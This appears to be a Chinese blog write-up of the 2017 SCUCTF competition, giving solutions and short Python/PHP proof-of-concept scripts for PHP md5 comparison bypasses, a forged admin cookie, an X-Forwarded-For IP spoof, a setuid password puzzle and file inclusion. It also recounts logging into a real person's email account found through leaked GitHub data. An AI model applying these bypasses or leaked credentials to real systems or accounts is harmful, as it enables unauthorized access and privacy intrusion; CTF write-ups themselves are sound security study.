---
layout: post
title:  "SCUCTF writeup"
date:  2017-05-16 23:59:09  +0800
subtitle:   "SCUCTF的writeup, 非官方版本"
author:    "Les1ie"
catalog: true
tags:
   - writeup
   - SCUCTF
   - 网络安全
---

## 0x00 SCUCTF writeup  
Les1ie写的writeup, 非官方版本

各位看官看看就好，不要喷我太菜

2017-5-16 23:55:30

## 0x01 蛤机器人

```text
http://119.29.16.200:5009
```

打开之后啥也没有，看到title里面说机器人，输入robots.txt, 看到一个.index.php.swp, 下载下来打开，看到网页源代码


```php
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>蛤机器人？</title>
    </head>
    <body>
        <p>蛤？</p>
    </body>
</html>
<?php
$ha = $_GET['ha'];
$s1 = $_GET['1s'];
if ($ha and $s1) {
    if ($ha == $s1) {
        echo '-1s';
    }else if (md5($ha) === md5($s1)) {
        echo '+1s<br>';
        echo $_FLAG;
    }else {
        echo '-1s';
    }
}
?>
```

代码审计题目, 看得出他是需要接受两个GET参数， `ha` 和 `1s`, `if`的语句表示这两个字符串不能相同，并且md5值相等就会打印出flag的值。

我第一反应是md5碰撞，网上找了下， 在[stack overflow](http://stackoverflow.com/questions/1756004/can-two-different-strings-generate-the-same-md5-hash-code) 找到了一个例子，但是提交却一直不对，于是问了出题人，出题人提示php里面数组是不可哈希的(突然想起来py里面也是这样的)，于是poc如下

```text
 http://119.29.16.200:5009/?ha[]=123&1s[]=4
```

 直接请求如下网址即可。

 另外，出题人用我的思路做出来了...把之前的字符串转成bin，然后urlencode请求过去，php的exp如下


```php
<?php
$str1 = file_get_contents('1.txt');
$str2 = file_get_contents('2.txt');
echo $str1."<br>";
echo $str2."<br>";
echo md5($str1)."<br>";
echo md5($str2)."<br>";
var_dump($str1 === $str2);
$str1 = urlencode($str1);
$str2 = urlencode($str2);
$url="http://119.29.16.200:5009/?ha=$str1&1s=$str2";
var_dump($url);
$html = file_get_contents($url);
var_dump($html);
?>
```

##### 文件是这两个
[1.txt](/img/scuctf/1.txt) 以及 [2.txt](/img/scuctf/2.txt)


我用python没有复现这个东西，用的urllib.urlencode()但是不行，试过了py2和py3都不行，遂放弃。

## 0x02哈希与科学计数法
进去就让我们查看源代码，看到有个hidden的1.txt, 打开看又是一个代码审计题目


```php
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>哈希与科学计数法的邂逅</title>
    </head>
    <body>
        <p>view-source</p>
        <a href="./1.txt" style="visibility: hidden;">有些好东西</a>
    </body>
</html>
<?php
require_once('flag.php');
$flag = $_GET['flag'];
if (!$flag) { exit(); }
if (strstr($flag,'200')) {
    exit('***');
}else {
    if (md5($flag) == md5('s1091221200a')) {
        echo $_FLAG;
    }else {
        echo '***';
    }
}
?>
```

提交一个flag参数， 参数里面如果包含`200`这个字符串就退出，如果字符串的md5值和`s1091221200a`一样就返回flag, 最开始我也没思路，一直没办法绕过。

问了出题人，出题人直接复制了这一个字符串，右键google...醉醉的，我咋没想到直接google这个数字呢

然后看到了这个一个[介绍](http://www.rabbit8.cn/569.html) php的哈希缺陷的，[这个也可以看](https://www.ohlinge.cn/php/0e_md5.html) ，然后页面里面随便选了一个值get提交就ok。 写了个exp如下


```python
import requests

url = 'http://119.29.16.200:5003'
str1 = 's1091221200a'
str2 = 'QNKCDZO'

web = requests.get(url+'/1.txt')
print web.encoding
web.encoding = 'utf-8'
print web.text
payload = {
        'flag': str2,
        }

r = requests.post(url, params=payload)
print r.encoding
r.encoding = 'utf-8'
print r.text
print r.headers

# 参考:http://www.rabbit8.cn/569.html
# flag{IsDc_0e_Th3e01}
```


## 0x03 admin
打开只有一个登录框，没有验证码提示账号密码都是test, 我猜是出题人怕我们写脚本爆破把服务器搞崩了，这个服务器在学校内网233333。

登录上去提示我们没有管理员权限，看了cookie以及网络请求都没东西，然后我试了试登录框用admin登录，开20个线程用burp爆破，10000的弱口令都没有..gg, 然后爆破的时候服务器500, 关了burp就没事，后来发现cookie是md5(test)的值， 然后把cookie改成md5(admin)就行了，poc如下


```python 
import requests

url = 'http://223.129.64.72:81/login'
url = 'http://223.129.64.72:81/'

payload = {
        'user':'test',
        'mm':'test'
        }
cookie = {
        'cookies': '21232f297a57a5a743894a0e4a801fc3'
        }

r = requests.Session()

# u = r.post(url,u payload, cookies=cookie)
u = requests.get(url, cookies=cookie)
print u.text
```

请求的页面不能加上login..., 也不需要再次登录，直接带cookie去get请求就出flag了..

## 0x04 fast
SCUCTF还没开始出题人就秀了一把他出的题目，给我看了headers, 我不知道是啥，他说了句，实验吧的天下武功唯快不破。

搜了一下思路有了，拿到flag发送回去就好，poc如下


```python
import requests
import base64

url = 'http://223.129.64.72:5000/'

r = requests.Session()
flag = r.get(url).headers['Flag']

print flag
flag = flag[5:]
# data = base64.b64encode(flag)

# flag = 'flag{%s}' % data
print flag
payload = {
        'flag':flag
        }
t = r.post(url+'flag', data=payload)
# t = r.get(url, params=payload)
print t.url
print t.text
```


但是还有个坑，部署他用的uwsgi, 这个针对时间要求特别高的不行，支持很差，第一天没人提交..23333我是第一天晚上才开始做这次的ctf的，那时候还没人提交这道题。

我问题哪里没对么，他说...服务器没对，2333，他重新搞了下，等我回寝室提交的时候就可以了，但是不是一血，有一个人在我之前提交了。

## 0x05 ip
打开显示


```html
您的IP是：121.48.213.217<br>不在允许范围，本系统仅允许202.115.47.141访问
```

觉得是学校的服务器的网段，扫了下扫不动，后来才知道这个是教务处的233333333333

改`X-Forwarded-For`头就行了，伪造来源ip, 利用的poc如下

```python
#! coding:utf-8
import requests

url = 'http://119.29.16.200:5004'

r = requests.get(url)
print r.encoding
r.encoding = 'utf-8'
print r.text

payload ={
        'X-Forwarded-For': '202.115.47.141'
        }
r = requests.get(url, headers=payload)
print r.url
print r.encoding
r.encoding = 'utf-8'
print r.text

# D:\Security\scuctf\ip>python ip.py
# http://119.29.16.200:5004/
# ISO-8859-1
# 您的IP是：202.115.47.141<br>flag{newip_1s_LnterEs9ing}

```

## 0x06 babyre
逆向题，丢到我32bit的kali的虚拟机没办法运行，拖进od也不行，最后知道这个是64bit的环境才行。

在64bit的服务器里运行如下:

```bash
~  23:23:59
$ ./babyre 
welcome to the re world
```

拖进64位的ida就行看到明文写的flag了，或者直接暴力的在terminal里面运行，

```bash
$ strings babyre 
.
.
.

flag{re_start_007}
welcome to the re world
.
.
.
```

直接找到了flag, 

## 0x07 逆向
给了个服务器的ip账号和密码，进去看到三个文件，一个flag, 一个test.c， 一个test.c编译后的二进制文件

```c
root@localhost:~/ctf# cat test.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
unsigned long password = 0x21DD09ED;

unsigned long check(const char* p) {
	int* ip = (int *)p;
	int i;
	int result = 0;
	for (i = 0; i < 5; i++) {
		result += ip[i];
	}
	return result;
}

int main(int argc, char *argv[]) {
	setuid(0);
	if(argc<2) {
		printf("usage : %s [password]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20) {
		printf("password length be 20 bytes\n");
		return 0;
	}
	printf("%x, %x", check(argv[1]), password);
	if(password == check(argv[1])) {
		system("/bin/cat flag");
		return 0;

	} else {
		printf("wrong passcode.\n");
	}
	return 0;
}
root@localhost:~/ctf# 
```

试了下该用户没有对该目录没有写权限，对flag文件没有r权限，对二进制文件有x权限，只能通过二进制文件去打印flag内容

源码的意思是调用二进制文件的时候传参数，长度为20的字符串，字符串4位作为一个整体，拆成五个部分，加起来等于0x21DD09ED就行。



## 0x08 社工
留了一个v2ex的节点，进去看到提示说有人发flag给他，还有个hint是flag_hi_github, 摆明就是github dork嘛... 

搜了下iscumail，在code里面找到一条记录，是126的邮箱，但是看了下时间是2016年github索引的文件，想着这个不会这么久之前的文件了，就没继续下去了

后来问了下他们..... 就是这个东西，然后我登进去126就看到了flag

另： 这个仓库最后一次commit的时间是2012年的.......出题人说这个是川大的一个学姐（学长？）的，以前的项目现在没用了，想着川大自己的人出题用用应该没事..


只想说这道题简直有毒

## 0x09 php
最后放的一道题，300的Point， 看着是php写的就想着放弃，翻了下发现有一个留言模块，但是试了下根本没用，因为后台没处理，然后就没做这道题了，因为没啥时间了。

这个是php文件包含，
大概就是

```
http://xxx.xx/index?index=xxxxxx
```


没有对xxx进行限制，然后就直接利用他执行命令了



## 0x0A 总结
炒鸡菜鸡，writeup随便写的记一下思路，说实话没做过这么简单的ctf题，233333

第一天有事没有做这个题目，晚上看了下没怎么做，第二天早上九点多才开始做，十二点就关答题了....

因为某些原因，比赛的24个小时很多时间一直和出题人待在一起的， 一直处在上帝视角233333，发现来了两个研究生，一路打到了第一和第二名....这个题目是给大一萌新做的... 赛棍们也是66666， 不过他们也是挺厉害来的，给个赞

另： 给几个出题人点个赞


转载烦请注明出处。

Les1ie

2017-5-17 00:19:18
